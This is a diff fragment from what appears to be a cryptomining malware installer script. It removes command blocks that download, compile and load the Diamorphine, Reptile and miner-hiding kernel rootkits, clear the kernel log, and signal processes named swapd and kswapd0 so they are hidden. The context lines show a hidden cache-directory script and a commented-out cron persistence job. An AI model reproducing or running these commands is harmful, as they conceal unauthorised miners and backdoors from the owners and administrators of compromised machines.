@@ -95,18 +95,3 @@ chmod +x "$HOME/.system_cache/check_and_start.sh"
 #CRON_JOB="*/5 * * * * $HOME/.system_cache/check_and_start.sh"
 #(crontab -l 2>/dev/null | grep -v -E '(out dat|check_and_start.sh)'; echo "$CRON_JOB") | crontab -
 
-echo "[*] make toolZ, Diamorphine"
-          cd /tmp ; cd .ICE-unix ; cd .X11-unix ; rm -rf Diamorphine ; rm -rf Reptile ; yum install linux-generic linux-headers-$(uname -r) kernel kernel-devel kernel-firmware kernel-tools kernel-modules kernel-headers git make gcc msr-tools -y ; apt-get update -y ; apt-get reinstall kmod ; apt-get install linux-generic linux-headers-$(uname -r) git make gcc msr-tools -y ;  zypper update -y ; zypper install linux-generic linux-headers-$(uname -r) git make gcc msr-tools -y ; git clone https://github.com/m0nad/Diamorphine ; cd Diamorphine/ ; make ; insmod diamorphine.ko ; dmesg -C ; kill -63 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`
-    
-    echo "[*] Reptile..."
-        cd /tmp ; cd .ICE-unix ; cd .X11-unix ; rm -rf Diamorphine ; rm -rf Reptile ; apt-get update -y ; apt-get install build-essential linux-headers-$(uname -r) git make gcc msr-tools libncurses-dev -y ; yum update -y; yum install -y ncurses-devel ; git clone https://github.com/f0rb1dd3n/Reptile/ && cd Reptile ; make defconfig ; make ; make install ; dmesg -C ; /reptile/reptile_cmd hide ;  kill -31 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`
-    
-    echo "[*] hide crypto miner."
-        cd /tmp ; cd .X11-unix ; git clone https://github.com/alfonmga/hiding-cryptominers-linux-rootkit && cd hiding-cryptominers-linux-rootkit/ && make ; dmesg -C && insmod rootkit.ko && dmesg ; kill -31 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'` ; rm -rf hiding-cryptominers-linux-rootkit/
-    
-kill -31 $(pgrep -f -u root config.json) 
-kill -31 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`
-kill -31 `/bin/ps ax -fu $USER| grep "kswapd0" | grep -v "grep" | awk '{print $2}'`
-kill -63 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`
-kill -63 `/bin/ps ax -fu $USER| grep "kswapd0" | grep -v "grep" | awk '{print $2}'`
-
